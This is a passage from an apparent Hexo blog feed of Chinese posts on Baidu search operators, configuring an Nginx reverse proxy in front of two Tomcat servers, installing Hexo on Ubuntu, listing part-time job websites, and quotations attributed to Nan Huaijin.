链接中</strong>.</p><p>网页 <code>url</code> 中的某些信息，常常有某种有价值的含义。您如果对搜索结果的 <code>url</code> 做某种限定，可以获得良好的效果。</p><p>例如：前端教程 inurl:video</p><p>查询词 “前端教程” 是可以出现在网页的任何位置，而 “video” 则必须出现在网页 <code>url</code> 中。</p><p><img src="https://segmentfault.com/img/remote/1460000038432210" alt="img"></p><h4 id="10-书名号《》"><a href="#10-书名号《》" class="headerlink" title="10.书名号《》"></a>10.书名号<code>《》</code></h4><p>查询词加上书名号<code>《》</code>有两层特殊功能</p><ul><li>一是书名号会出现在搜索结果中；</li><li>二是被书名号括起来的内容，不会被拆分。</li></ul><p>比如：《JavaScript高级程序设计（第4版）》</p><p><img src="https://segmentfault.com/img/remote/1460000038432211" alt="img"></p><p>书名号在某些情况下特别有效果，比如查询词为手机，如果不加书名号在很多情况下出来的是通讯工具手机，而加上书名号后，《手机》结果就都是关于电影方面的了。</p><h4 id="11-包含特定查询词"><a href="#11-包含特定查询词" class="headerlink" title="11.+ 包含特定查询词"></a>11.+ 包含特定查询词</h4><p>查询词用加号 <code>+</code> 语法可以帮您在搜索结果中 <strong>必需包含特定的关键词</strong> 的所有网页。</p><p>例子：全栈工程师 +node</p><p>查询词 “全栈工程师” 在搜索结果中，“node” 被必需被包含在搜索结果中。</p><p><img src="https://segmentfault.com/img/remote/1460000038432206" alt="img"></p><h4 id="12-Filetype-搜索指定文档格式"><a href="#12-Filetype-搜索指定文档格式" class="headerlink" title="12.Filetype 搜索指定文档格式"></a>12.Filetype 搜索指定文档格式</h4><p>查询词用 <code>Filetype</code> 语法可以限定查询词出现在指定的文档中，支持文档格式有 <code>pdf，doc，xls，ppt，rtf</code>。对于找文档资料相当有帮助。</p><p>比如：filetype:pdf JavaScript高级程序设计（第4版）</p><p><img src="https://segmentfault.com/img/remote/1460000038432219" alt="img"></p><p>不过相对谷歌而已，百度的搜索是把自己的产品，放在前面，见上图，排在前面的都是百度自己的产品，百度文库。</p><hr><p>在百度搜索中，其中 <code>site</code> 命令和双引号关键词 <code>&quot; &quot;</code> 这两个命令用得相对较多，也最容易记住。</p>]]></content>
      
      
      <categories>
          
          <category> 搜索引擎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEO </tag>
            
            <tag> 精准搜索 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx反向代理</title>
      <link href="2020/06/14/nginx-fan-xiang-dai-li/"/>
      <url>2020/06/14/nginx-fan-xiang-dai-li/</url>
      
        <content type="html"><![CDATA[<p>Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少，并发能力强。</p><p>Nginx 服务器的反向代理服务是其最常用的重要功能，由反向代理服务也可以衍生出很多与此相关的 Nginx 服务器重要功能，比如后面会介绍的负载均衡。本篇博客我们会先介绍 Nginx 的反向代理，当然在了解反向代理之前，我们需要先知道什么是代理以及什么是正向代理。</p><h1 id="1、代理"><a href="#1、代理" class="headerlink" title="1、代理"></a>1、代理</h1><p>在Java设计模式中，代理模式是这样定义的：给某个对象提供一个代理对象，并由代理对象控制原对象的引用。</p><p>　　可能大家不太明白这句话，在举一个现实生活中的例子：比如我们要买一间二手房，虽然我们可以自己去找房源，但是这太花费时间精力了，而且房屋质量检测以及房屋过户等一系列手续也都得我们去办，再说现在这个社会，等我们找到房源，说不定房子都已经涨价了，那么怎么办呢？最简单快捷的方法就是找二手房中介公司（为什么？别人那里房源多啊），于是我们就委托中介公司来给我找合适的房子，以及后续的质量检测过户等操作，我们只需要选好自己想要的房子，然后交钱就行了。</p><p>　　代理简单来说，就是如果我们想做什么，但又不想直接去做，那么这时候就找另外一个人帮我们去做。那么这个例子里面的中介公司就是给我们做代理服务的，我们委托中介公司帮我们找房子。</p><p>　　Nginx 主要能够代理如下几种协议，其中用到的最多的就是做Http代理服务器　　</p><h1 id="2-正向代理"><a href="#2-正向代理" class="headerlink" title="2.正向代理"></a>2.正向代理</h1><p>　　弄清楚什么是代理了，那么什么又是正向代理呢？</p><p>　　这里我再举一个例子：大家都知道，现在国内是访问不了 Google的，那么怎么才能访问 Google呢？我们又想，美国人不是能访问 Google吗（这不废话，Google就是美国的），如果我们电脑的对外公网 IP 地址能变成美国的 IP 地址，那不就可以访问 Google了。你很聪明，VPN 就是这样产生的。我们在访问 Google 时，先连上 VPN 服务器将我们的 IP 地址变成美国的 IP 地址，然后就可以顺利的访问了。</p><p>　　这里的 VPN 就是做正向代理的。正向代理服务器位于客户端和服务器之间，为了向服务器获取数据，客户端要向代理服务器发送一个请求，并指定目标服务器，代理服务器将目标服务器返回的数据转交给客户端。这里客户端是要进行一些正向代理的设置的。</p><p>　　PS：这里介绍一下什么是 VPN，VPN 通俗的讲就是一种中转服务，当我们电脑接入 VPN 后，我们对外 IP 地址就会变成 VPN 服务器的 公网 IP，我们请求或接受任何数据都会通过这个VPN 服务器然后传入到我们本机。这样做有什么好处呢？比如 VPN 游戏加速方面的原理，我们要玩网通区的 LOL，但是本机接入的是电信的宽带，玩网通区的会比较卡，这时候就利用 VPN 将电信网络变为网通网络，然后在玩网通区的LOL就不会卡了（注意：VPN 是不能增加带宽的，不要以为不卡了是因为网速提升了）。</p><p>　　可能听到这里大家还是很抽象，没关系，和下面的反向代理对比理解就简单了。　　</p><h1 id="3-反向代理"><a href="#3-反向代理" class="headerlink" title="3.反向代理"></a>3.反向代理</h1><p>反向代理和正向代理的区别就是：<strong>正向代理代理客户端，反向代理代理服务器。</strong></p><p>　　反向代理，其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。</p><p>　　下面我们通过两张图来对比正向代理和方向代理：<br>　　<img src="https://s1.ax1x.com/2020/07/02/NLZjAS.jpg" alt><br>　　<img src="https://s1.ax1x.com/2020/07/02/NLZO78.jpg" alt><br>　　理解这两种代理的关键在于代理服务器所代理的对象是什么，正向代理代理的是客户端，我们需要在客户端进行一些代理的设置。而反向代理代理的是服务器，作为客户端的我们是无法感知到服务器的真实存在的。</p><p>　　总结起来还是一句话：<strong>正向代理代理客户端，反向代理代理服务器</strong>。</p><h1 id="4-Nginx-反向代理"><a href="#4-Nginx-反向代理" class="headerlink" title="4.Nginx 反向代理"></a>4.Nginx 反向代理</h1><p>首先：说一下准备工作，最少两个tomcat，另外设置两个域名并解析到本地ip（因为nginx是直接配置域名）</p><h4 id="4-1分别设置两个tomcat的-conf-server-xml中的端口号，如下"><a href="#4-1分别设置两个tomcat的-conf-server-xml中的端口号，如下" class="headerlink" title="4.1分别设置两个tomcat的/conf/server.xml中的端口号，如下"></a>4.1分别设置两个tomcat的/conf/server.xml中的端口号，如下</h4><p><img src="https://s1.ax1x.com/2020/07/02/NLu1H0.png" alt><br><img src="https://s1.ax1x.com/2020/07/02/NLulBq.png" alt><br>tomcat1端口号分别设置为: 8001</p><p>tomcat2端口号分别设置为：8002</p><h4 id="4-2添加测试内容"><a href="#4-2添加测试内容" class="headerlink" title="4.2添加测试内容"></a>4.2添加测试内容</h4><p>分别删除目录webapps下所有文件，新建一个文件夹ROOT，并在该目录下新建index.html</p><p>内容可以设置为：这里是8001端口。（另一个：这里是8002端口。）</p><h4 id="4-3启动两个Tomcat"><a href="#4-3启动两个Tomcat" class="headerlink" title="4.3启动两个Tomcat"></a>4.3启动两个Tomcat</h4><p>在这里会出线一个问题不能同时启动两个tomcat</p><p><img src="https://s1.ax1x.com/2020/07/02/NLuGNT.png" alt></p><p><img src="https://s1.ax1x.com/2020/07/02/NLu8EV.png" alt></p><h4 id="4-4访问下面两个路径"><a href="#4-4访问下面两个路径" class="headerlink" title="4.4访问下面两个路径"></a>4.4访问下面两个路径</h4><p>127.0.0.1/8001<br><img src="https://s1.ax1x.com/2020/07/02/NLKMGD.png" alt="NLKMGD.png"></p><p>127.0.0.1/8002<br><img src="https://s1.ax1x.com/2020/07/02/NLKKPO.png" alt="NLKKPO.png"><br>能够访问到对应的index.html文件就好了。</p><h4 id="4-4设置两个域名并解析"><a href="#4-4设置两个域名并解析" class="headerlink" title="4.4设置两个域名并解析"></a>4.4设置两个域名并解析</h4><p>修改hosts文件，目的是为了设置2个域名， tomcat1.com和 tomcat2.com并且解析到本地ip：127.0.0.1</p><p>路径：C:\Windows\System32\drivers\etc<br><img src="https://s1.ax1x.com/2020/07/02/NLMMT0.png" alt="NLMMT0.png"></p><p>打开hosts文件，加上（如果修改后无法保存，可以把hosts文件复制到桌面，添加后再替换）</p><pre><code>127.0.0.1 123.com127.0.0.1 1234.com</code></pre><p><img src="https://s1.ax1x.com/2020/07/02/NLMlkV.png" alt="NLMlkV.png"></p><h4 id="4-5测试域名解析是否能够访问"><a href="#4-5测试域名解析是否能够访问" class="headerlink" title="4.5测试域名解析是否能够访问"></a>4.5测试域名解析是否能够访问</h4><p>输入：123.com/test</p><p><a href="https://imgchr.com/i/NLM2nA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/02/NLM2nA.png" alt="NLM2nA.png"></a><br>输入：1234.com/test<br><a href="https://imgchr.com/i/NLMcXd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/02/NLMcXd.png" alt="NLMcXd.png"></a></p><h4 id="4-6配置反向代理"><a href="#4-6配置反向代理" class="headerlink" title="4.6配置反向代理"></a>4.6配置反向代理</h4><pre><code>server {        listen       80;         server_name  123.com;        location  / {        proxy_pass   http://127.0.0.1:8001/test;        index  index.html index.htm;        }    }server {        listen       80;        server_name  1234.com;        location / {        proxy_pass   http://127.0.0.1:8002/test;        index  index.html index.htm;        }    }</code></pre><h4 id="4-7测试是否配置成功"><a href="#4-7测试是否配置成功" class="headerlink" title="4.7测试是否配置成功"></a>4.7测试是否配置成功</h4><p><a href="https://imgchr.com/i/NLM66H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/02/NLM66H.png" alt="NLM66H.png"></a><br><a href="https://imgchr.com/i/NLMy1e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/02/NLMy1e.png" alt="NLMy1e.png"></a></p><p><strong>若是测试失败查看端口是否被占用</strong><br>cmd中输入：netstat -an|find “0:80”</p>]]></content>
      
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客整体性能优化</title>
      <link href="2020/05/26/hexo-bo-ke-zheng-ti-xing-neng-you-hua/"/>
      <url>2020/05/26/hexo-bo-ke-zheng-ti-xing-neng-you-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="hexo博客整体性能优化"><a href="#hexo博客整体性能优化" class="headerlink" title="hexo博客整体性能优化"></a>hexo博客整体性能优化</h3><h4 id="1-查找原因"><a href="#1-查找原因" class="headerlink" title="1.查找原因"></a>1.查找原因</h4><p>排查原因静态资源耗时较长,</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/blog/image-20210608101142696.png" alt="image-20210608101142696"></p><h4 id="2-解决方式"><a href="#2-解决方式" class="headerlink" title="2.解决方式"></a>2.解决方式</h4><p>采用又拍云的云服务,静态资源加速开启最近的技术趋势webp技术</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/blog/image-20210608112132196.png" alt="image-20210608112132196"></p><h4 id="3-成果"><a href="#3-成果" class="headerlink" title="3.成果"></a>3.成果</h4><p>响应速度控制在1.1秒</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/blog/image-20210608112035856.png" alt="image-20210608112035856"></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客，hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu16.04中安装hexo</title>
      <link href="2020/05/12/zai-ubuntu16-04-zhong-an-zhuang-hexo/"/>
      <url>2020/05/12/zai-ubuntu16-04-zhong-an-zhuang-hexo/</url>
      
        <content type="html"><![CDATA[<p>在Ubuntu16.04中安装hexo出现一系列的问题，总结一下安装hexo的步骤;</p><p>首先安装noejs，Ubuntu源中的nodejs时旧版本，所以需要在安装后更新nodejs;</p><pre><code> &gt; sudo apt-get install nodejs sudo apt install nodejs-legacy sudo apt install npm</code></pre><p>更换成淘宝的镜像，否则非常慢</p><p>  <code>sudo npm config set registry https://registry.npm.taobao.org</code></p><p>可以通过 sudo npm config list 查看是否生效</p><p>安装更新版本的工具N</p><p>  <code>sudo npm install n -g</code></p><p>更新版本</p><p>  <code>sudo n stable</code></p><p>可以看到有 installed：版号，说明更新成功</p><p>安装hexo</p><p>  <code>sudo npm install -g hexo</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>兼职资源总结</title>
      <link href="2020/04/03/jian-zhi-zi-yuan-zong-jie/"/>
      <url>2020/04/03/jian-zhi-zi-yuan-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="兼职资源总结"><a href="#兼职资源总结" class="headerlink" title="兼职资源总结"></a>兼职资源总结</h1><h2 id="体力型"><a href="#体力型" class="headerlink" title="体力型"></a>体力型</h2><p>如果你想靠自己的体力来获取酬金，你就是属于体力型，比如跑腿、送外卖、送快递、搬砖等等。劳动最光荣，无谓体力还是智力，凭本事挣钱，没什么不好意思的。只要愿意干，就会有收入。</p><pre><code>人人跑腿：http://www.renrenrun.com/爱跑腿：http://www.ipaotui.com/index.php?m=Home&amp;c=IndexFourth&amp;a=runner美团跑腿：http://i.meituan.com/peisong/达达骑士：https://www.imdada.cn/transporter/UU跑腿：https://www.uupt.com/Driver.htm蜂鸟众包：https://fengniao.ele.me/delivery.html 《手把手教你使用蜂鸟众包》点我达骑手：https://www.dianwoda.com/rider.html微差事：http://www.weichaishi.com/customer.php</code></pre><h2 id="问卷调查型"><a href="#问卷调查型" class="headerlink" title="问卷调查型"></a>问卷调查型</h2><p>通过回答问卷问题，获取一定的积分或金币，积分或金币可兑换现金或礼品。无技术含量，适合新人小白，有时间，有手机就可以做，但性价比不高，而且可能你答了半天得到的结果是“非常抱歉，你不符合本次调查的要求！”，之前全是在浪费时间了。</p><pre><code>第一调查网：https://www.1diaocha.com/集思网：https://www.opinionworld.cn/zh-cn投吧：https://www.votebar.com/YouGov：https://china.yougov.com/zh/爱调查：http://www.52survey.com/易调网：http://www.yidiao.net/调研吧：http://www.diaoyanba.com/K任务：https://www.krenwu.com/</code></pre><h2 id="电脑技术型"><a href="#电脑技术型" class="headerlink" title="电脑技术型"></a>电脑技术型</h2><p>电脑技术型比较适合会程序设计方面的新手，有些小伙伴可能之前只是自己埋头苦练功法，从未思考过利用自己的电脑技术进行副业赚钱。可以去学院当老师，或者接单赚外快。</p><pre><code>51CTO学院：https://edu.51cto.com/lecturer/lectopics?edunavCSDN学院：https://edu.csdn.net/apply微擎：https://dev.w7.cc云沃客：https://www.clouderwork.com/guide/freelancer开源中国众包：https://zb.oschina.net/services/excellent-dev.html猿急送：https://www.yuanjisong.com/job互站网：https://task.huzhan.com程序员客栈：https://www.proginn.com/job/?from=top_nav码易众包：https://www.mayigeek.com/tab/taskList?type=&amp;price=&amp;bidEnd=码市众包：https://codemart.com/projects解放号：https://www.jfh.com/jfportal/market/index麦子学院：已倒闭</code></pre><h2 id="任务型"><a href="#任务型" class="headerlink" title="任务型"></a>任务型</h2><p>任务型，顾名思义，任务比较简单，难度系数低，适合新手小白，但和问卷调查一样，收益有限，略高于问卷类，奶茶自由可实现。<br>做任务类的副业比较简单，没什么难度，也适合所有人，不过收益也有限，每天能赚个几十块钱。</p><pre><code>阿里众包百度众测腾讯搜活帮有道众包京东微工爱数众包龙猫众包百川任务</code></pre><h2 id="设计型"><a href="#设计型" class="headerlink" title="设计型"></a>设计型</h2><p>设计型，就是你恰好会PS、CAD、3dmax、AI、AE等设计类软件上有一定的基础和造诣，利用自己的设计作品或签约设计平台来进行副业赚钱。其中包括设计logo、表情包</p><pre><code>FOTOR云琥在线千图网昵图网花瓣网阿里巴巴矢量图标库开三云匠网扁平图标视觉中国picpas海洛创意东方IC中国图库图虫微信表情开放平台汇图网小米主题商店猪八戒</code></pre><h2 id="PPT设计型"><a href="#PPT设计型" class="headerlink" title="PPT设计型"></a>PPT设计型</h2><p>换言之，利用自己设计的PPT进行副业赚钱，或者签约PPT设计平台进行副业赚钱。可以出售PPT模板、个人简历模板等。</p><pre><code>咸鱼稻壳儿网演界网pptstore变色龙脚步网</code></pre><h2 id="翻译型"><a href="#翻译型" class="headerlink" title="翻译型"></a>翻译型</h2><p>翻译就是通过自己的英语水平，利用自己的翻译能力去换取一定的翻译酬金。一般网站右上角都有加入的途径，看一下对方的需要，一般会有入驻前有测试，也是为了保证译者的质量。</p><pre><code>人人译有道云翻译Gengo译喵网译客快译网Fiberead做到网我译网</code></pre><h2 id="知识付费"><a href="#知识付费" class="headerlink" title="知识付费"></a>知识付费</h2><p>如果你在某个细分领域有一定的专业性，可以尝试做自己的个人IP，通过分享自己的课程来赚取一定的副业收入。开课收徒吧老师们</p><pre><code>知乎live唯库荔枝微课腾讯课堂网易云课堂知识星球千聊小鹅通</code></pre><h2 id="自媒体"><a href="#自媒体" class="headerlink" title="自媒体"></a>自媒体</h2><p>所谓自媒体，就是利用平台来打造个人IP，或者利用平台来赚取平台的流量费用。2020年了，是时候打造一个个人IP了，同时也是复利很强的一种副业模式，但需要你坚持输出，坚持做下去。写作，其实对很多人都没有那么难，尤其对于新手小白，也可以利用自媒体平台打磨自己的技能。</p><pre><code>知乎微信公众号百家号企鹅号大鱼号今日头条小红书趣头条豆瓣搜狐号简书</code></pre><h2 id="直播型"><a href="#直播型" class="headerlink" title="直播型"></a>直播型</h2><p>直播是通过一定的才艺表演或一定的直播内容产生副业收入，但并不是每个人都需要有一定的才艺的，比如前一段时间比较火的无人直播、睡觉直播。</p><pre><code>bilibili，即B站抖音快手全民小视频腾讯微视腾讯NOW直播微信视频号斗鱼虎牙</code></pre><h2 id="音频型"><a href="#音频型" class="headerlink" title="音频型"></a>音频型</h2><p>利用自己的声音开始副业，声音比较好的小伙伴比较适合，很多平台都有入住入口。比如配音、电台主播、有声小说。</p><pre><code>喜马拉雅FM荔枝FM今日头条音频配音秀配音圈</code></pre><h2 id="投稿写作类"><a href="#投稿写作类" class="headerlink" title="投稿写作类"></a>投稿写作类</h2><p>这个不需要多说，最主要是的是能否坚持，能不能不断去打磨自己的技能，需要有一定的文笔功力。网络小说写作</p><pre><code>起点中文网：作家专区纵横中文网：作家专区17K小说网：作家专区晋江文学城：作家专区创世中文网：作家专区潇湘书院：作家专区</code></pre><h2 id="写手类网站"><a href="#写手类网站" class="headerlink" title="写手类网站"></a>写手类网站</h2><pre><code>稿稿中国赏金写手网豆瓣稿费银行天使领域浮云殿中国写手之家</code></pre><h2 id="手机APP平台"><a href="#手机APP平台" class="headerlink" title="手机APP平台"></a>手机APP平台</h2><pre><code>网易蜗牛读书汤圆创作每天读点故事壹写作简书拆书稿、听书稿壹心理慈怀读书会樊登读书会有书365读书蜗牛读书领读人十点读书会</code></pre><h2 id="各接稿的公众号"><a href="#各接稿的公众号" class="headerlink" title="各接稿的公众号"></a>各接稿的公众号</h2><pre><code>懒觉大妈</code></pre><h2 id="问答类"><a href="#问答类" class="headerlink" title="问答类"></a>问答类</h2><p>通过回答问题来换取平台收入或打造个人IP。</p><pre><code>百度知道合伙人悟空问答知乎在行</code></pre><h2 id="推广类"><a href="#推广类" class="headerlink" title="推广类"></a>推广类</h2><p>这个副业是推荐商品赚取佣金。</p><pre><code>淘宝联盟京东联盟多多进宝天眼查推广大疆联盟</code></pre><h2 id="文档类"><a href="#文档类" class="headerlink" title="文档类"></a>文档类</h2><p>上传资料到文档，别人下载就能赚取收益。</p><pre><code>百度文库豆丁文库道客巴巴</code></pre><h2 id="拍照类"><a href="#拍照类" class="headerlink" title="拍照类"></a>拍照类</h2><p>这个副业主要是拍一些门店或街道，完成任务后获得平台的奖励。</p><pre><code>美团拍店企鹅汇图高德地图淘金百度地图淘金</code></pre><h2 id="家教类"><a href="#家教类" class="headerlink" title="家教类"></a>家教类</h2><p>这个适合有专业技能的大学生或教师的副业，对学历有要求，一般需要本科以上，目前的家教时薪大致在50-200元/时左右。</p><pre><code>学而思网校app海风智学中心app掌门1对1作业帮答主轻轻教育课桌</code></pre><h2 id="二手交易类"><a href="#二手交易类" class="headerlink" title="二手交易类"></a>二手交易类</h2><p>买卖二手商品赚钱，或者倒卖商品赚差价钱。</p><pre><code>转转闲鱼</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 兼职 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南怀瑾经典语录</title>
      <link href="2020/03/12/nan-huai-jin-jing-dian-yu-lu/"/>
      <url>2020/03/12/nan-huai-jin-jing-dian-yu-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="南怀瑾经典语录"><a href="#南怀瑾经典语录" class="headerlink" title="南怀瑾经典语录"></a>南怀瑾经典语录</h1><ul><li><code>道为古，儒为表，大度看世界。技在手，能在身，思在脑，从容过生活。</code></li></ul><ul><li><p><code>有器度、有见识的人，他虽然从艰苦困难中成长，反而更具有同情心和慷慨好义的胸襟怀抱。因为他懂得人生，知道世情的甘苦。</code></p></li><li><p><code>学问最难是平淡，安于平淡的人，什么事业都可以做。</code></p></li><li><p><code>人生最高境界：佛为心，道为骨，儒为表，大度看世界。技在手，能在身，思在脑，从容过生活。三千年读史，不外功名利禄；九万里悟道，终归诗酒田园。</code></p></li><li><p><code>所以我常告诉青年同学们，一个人先要养成会享受寂寞，那你就差不多了，可以了解人生了，才体会到人生更高远的一层境界。这才会看到鸿福是厌烦的。佛经上说，一个学佛的人，你首先观察他有没有发起厌离心，也就是说厌烦世间的鸿福，对鸿福有厌离心，才是走向学佛之路。</code></p></li><li><p><code>道是天下人的公道。生命的意义不在肉体上，自性是光明的，不要被四大牵着走，不要玩弄四大。</code></p></li><li><p><code>有人指出你的烦恼，指出你的业障和染污的心理，自己还不服气，还不肯改，然后还抱住那习气业力的心理，把它当宝贝。唉！就让你去缠绵吧，反正六道轮回也蛮好玩的，多滚几回，我在那边等你就是。</code></p></li><li><p><code>智慧不是财产或世间福德所能换来的，是要多生累积福德来的。</code></p></li><li><p><code>当年我读四书五经，都是要背的。小朋友们要放学了，心里高兴，一边嘴里唱着一边你推我一下，我推你一把的。这样读书，心里会记住，一辈子忘不了。想起来的时候心里默念一下，其中的道理就又琢磨了一回。</code></p></li><li><p><code>生命就是这样，年年都有个春天，年年也有个冬天，这是生灭两头的现象；念头、细胞乃至一切物质也是有生有灭，永远都是这样。找到了生命能生能灭的根本，叫做成佛，叫证得菩提。……为什么佛教到中国，很容易就被吸收呢？因为中国文化的老祖宗，也讲过这个道理。</code></p></li><li><p><code>你说完没有？换我说了。</code></p></li><li><p><code>“投隙抵时，应事无方”这八个字要紧得很！你懂了以后一生妙用无穷…随便到哪里都可以找到工作，大的大做，小的小做你说你是个博士到处找不到工作，现在为了吃饭，有个地方需要一个工友不要说什么博士啊！问你学历，直说我小学毕业问你认不认得字啊？大字认得几个，小字不认得。</code></p></li><li><p><code>人不能没有学问，不能没有知识，仅为了学问而钻到牛角尖里去，又有什么用？像这样的学问，我们不大赞成。</code></p></li><li><p><code>学道要营养好，休息得够，才能用功，人家问我闭关做啥！睡觉。一进关房先睡七八天，以后不要睡了，一坐就用功了。尤其是夜里十一点以后一定要睡觉，烂睡一卧，那才会有精神。</code></p></li><li><p><code>道是天下人的公道。生命 的意义不在肉体上，自性是光明的，不要被四大牵着走，不要玩弄四大。</code></p></li><li><p><code>佛为心，道为骨，儒为表，大度看世界。</code></p></li><li><p><code>秋风落叶乱为堆， 扫去还来千百回。 一笑罢休闲处坐， 任他着地自成灰。</code></p></li><li><p><code>在艰苦中成长成功之人，往往由于心理的阴影，会导致变态的偏差。这种偏差，便是对社会对人们始终有一种仇视的敌意，不相信任何一个人，更不同情任何一个人。爱钱如命的悭吝，还是心理变态上的次要现象。相反的，有器度有见识的人，他虽然从艰苦困难中成长，反而更具有同情心和慷慨好义的胸襟怀抱。因为他懂得人生，知道世情的甘苦。</code></p></li><li><p><code>政治、军事、外交都是没有善恶是非的，只有利害关系。怎么临时处理，要懂得应变。但是要注意，虽然没有善恶是非，都还是有因果的。</code></p></li><li><p><code>“终身逌然，不知荣辱之在彼也，在我也”，这就是人生哲学。人为什么要外面人讲你好，你才觉得自己好呢？外面跟我毫不相干，在我自己，我认为好就好，爱笑就笑，爱哭就哭，跟别人毫不相干。</code></p></li><li><p><code>一个人内心没有涵养，就会变成色厉内荏，表面满不在乎，而内心非常空虚。其实，大可不必。一个人好就是好，穷就是穷，痛苦就是痛苦。</code></p></li><li><p><code>这是最好的时代，也是最坏的时代。西方文化的贡献，促进了物质文明的发达，这在表面上来看，可以说是幸福；坏，是指人们为了生存的竞争而忙碌，为了战争的毁灭而惶恐，为了欲海的难填而烦恼。在精神上，是最痛苦的。人类正面临着一个新的危机。</code></p></li><li><p><code>“我除了依照佛经以外，拿我几十年摸索的经验，诚恳地告诉各位，你真达到正身、正意，没有一个身体不能转化；没有病去不掉的；没有身心不会健康的。正身、正意做到了，身心两方面绝对地健康，可以返老还童。因为一切唯心所造，这是真的，就是“正身”、“正意”四个字。”</code></p></li><li><p><code>人生的最高境界是佛为心，道为骨，儒为表，大度看世界。技在手，能在身，思在脑，从容过生活。</code></p></li><li><p><code>畏就是敬，人生无所畏，实在很危险。</code></p></li><li><p><code>中国古人不轻易写书写文章。今日很多的文章、戏剧、新闻，写的是社会坏的一面，对小孩子有很坏的影响，这种文字对社会的影响比杀人还厉害。其实写的人未必有心教人学坏，也有写正面的，但是接受的人不看正面。古人对人类这种心理非常了解，所以下笔非常严谨。</code></p></li><li><p><code>有些人日常很忙，注意！赶快多打坐，不要以为忙啊！累啊！没时间。你要赶快坐，坐到能够住气，那么一个钟头下来，一天都用不完，但要真正做到了才行。不过有一点要注意！肠胃要空虚一点。道家两句话：“若要不老，腹中不饱。若要不死，肠内无屎。”当然营养还是要够，肠胃干净，气就容易充实。</code></p></li><li><p><code>天堂固然好，但却有人偏要死也不厌地狱。极乐世界固然使人羡慕，心向往之，但却有人愿意永远沐浴在无边苦海中，以苦为乐。与其舍一而取一，早已背道而驰。不如两两相忘，不执着于真假、善恶、美丑，便可得其道妙而逍遥自在了。</code></p></li><li><p><code>佛学为什么讲无常？因为世界上的事没有永恒的。人的欲望，永远贪求永恒，想永远保持存在，那是永远不可能的，那是笨蛋，是看不清楚的人搞的。所以佛告诉你，积聚必有消散，崇高必有堕落，合会终须别离，……那是必然的道理，这是大原则。</code></p></li><li><p><code>今天的世界惟科技马首是瞻，人格养成没有了，都是乱的不成器的，教育只是贩卖知识，这是根本乱源，是苦恼之源。只有科学、科技、哲学、宗教、文艺、人格养成教育回归一体，回归本位，均衡发展，才有希望。</code></p></li></ul><ul><li><p><code>今日的世界，物质文明发达，在表面上来看，是历史上最幸福的时代；但是人们为了生存的竞争而忙碌，为了战争的毁灭而惶恐，为了欲海的难填而烦恼。在精神上，也可以说是历史上最痛苦的时代。人是莫名其妙的生下来，无可奈何的活着，最后是不知所以然的死掉。”</code></p></li><li><p><code>在艰苦中成长成功之人，往往由于心理的阴影，会导致变态的偏差。这种偏差，便是对社会、对人们始终有一种仇视的敌意，不相信任何一个人，更不同情任何一个人。爱钱如命的悭吝，还是心理变态上的次要现象。相反的，有器度、有见识的人，他虽然从艰苦困难中成长，反而更具有同情心和慷慨好义的胸襟怀抱。因为他懂得人生，知道世情的甘苦。</code></p></li><li><p><code>生命，只在被欲望迷乱了的人心中，才一定要分出尊卑高下。不争，是人生至境。</code></p></li><li><p><code>是医心的，不管西医中医，都只是医身体的。心是个什么东西？思想情绪这个心很难医。我在美国的时候，看到一个日本人画的中国画，非常好。画的是中国大医师唐朝的孙思邈。……我得到孙思邈这幅画，很有感想，就写了一副对联：上联是“ 有药能医龙虎病”，龙王生病了向他求医；老虎生病也向他求医。……下联“  无方可治众生痴 ”，世界上哪个医生可以把笨蛋的头脑医得聪明起来？所以我说老庄讲的内容，就是医药。所有思想病、政治病、经济病，各种病，在里头提的非常多了，只看大家如何去研究。 释迦牟尼佛的佛法，老庄以及，都是治心的药，也是治心的方法。一般医生能够治身体的病，却不能治心。</code></p></li><li><p><code>世界上任何人，一辈子只做三件事，不是自欺，就是欺人，再不然就是被人欺。你看世界上的人，能不能逃出这三样事？能逃出了这三样的话，就跳出三界外了。</code></p></li><li><p><code>我看你们来学佛学道，年纪轻轻，非常照顾自己，又懒，又不肯助人，但要求起别人却非常严格，看看这个不对、那个也不对，觉得别人都不是圣贤，难道你就是圣贤吗？我看你是“剩闲”，是剩下来没有用的闲人，有你也不多、没你也不少的人。</code></p></li><li><p><code>当将军的五个条件：像牛一样的健壮；像狗一样的下贱；像狐狸一样的狡猾；像猴子一样的精明；像魔鬼一样的魅力。</code></p></li><li><p><code>我们学佛，不但要通达佛经，连世间的一切知识技能也要通，在家是好子女、好父母，在社会是真正有贡献的人，这样可以算学佛。</code></p></li><li><p><code>穷归穷，绝不愁，如果又穷又愁，这就划不来，变成穷愁潦倒就冤得很。</code></p></li><li><p><code>修行就像扫帚一样，心里头杂念都要扫掉，无住相布施，所以无住相这一句话就是扫帚，你心里头什么妄念都要扫掉。</code></p></li><li><p><code>佛学叫这个世界“娑婆世界”，译为“堪忍”，说我们这个世界是缺陷的世界。也说这个世界是缺陷的，让你有钱就不给你学问，有学问就没有钱；给你子孙满堂，就不给你别样了，所以总是有缺陷不圆满